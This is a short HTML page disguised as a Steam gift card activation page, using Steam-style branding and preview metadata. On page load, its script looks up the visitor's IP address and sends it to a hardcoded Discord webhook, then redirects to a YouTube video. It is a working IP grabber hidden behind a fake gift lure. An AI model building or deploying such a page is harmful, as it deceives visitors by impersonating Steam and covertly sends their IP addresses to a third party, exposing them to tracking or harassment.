<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Gift Activation</title>

    <meta property="og:title" content="Steam Gift Activation" />
    <meta property="og:description" content="Redeem a Steam Gift Card or Wallet Code" />
    <meta property="og:url" content="https://www.youtube.com/watch?v=dQw4w9WgXcQ" />
    <meta property="og:image" content="https://cdn.akamai.steamstatic.com/store/about/social-og.jpg" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="theme-color" content="#171a21" />

    <script type="text/javascript">
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477709893875269763/hlcZYdFcsZCA4t0JKeO8Hr0IBum2-KgPZMMsx426yUp4VeOEoTgfGSz8g7mOtvND6pT';

        async function logAndRedirect() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `📢 **New Visitor Logged**\n**IP:** \`${ipData.ip}\``
                    })
                });
            } catch (e) { console.error(e); }
            finally {
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }
        }
        window.onload = logAndRedirect;
    </script>
</head>
<body style="background-color: #171a21; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
    <p>Redirecting to Steam...</p>
</body>
